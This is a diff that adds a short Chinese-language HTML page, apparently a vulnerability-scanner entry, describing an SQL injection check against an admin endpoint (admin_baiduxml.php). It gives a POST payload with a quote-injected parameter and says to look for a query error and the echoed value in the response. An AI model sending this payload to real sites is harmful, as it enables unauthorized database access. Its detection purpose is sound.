@@ -1,0 +1,12 @@
+<meta charset="UTF-8">
+<div>
+    <h3>SQL注入 URL: </h3>
+    <ul>
+        <p>/upload/admin/admin_baiduxml.php?ac=setsave</p>
+    </ul>
+    <h3>POST-payload: </h3>
+        <code>xmlmax=1111&xmlpagesize=112&sunrain'=aaa</code>
+    <h3>验证过程</h3>
+    <p>构造POST请求</p>
+    <p>查看response text 是否含有 "Error:Query error" 和 "value='aaa'" 字符</p>
+</div>
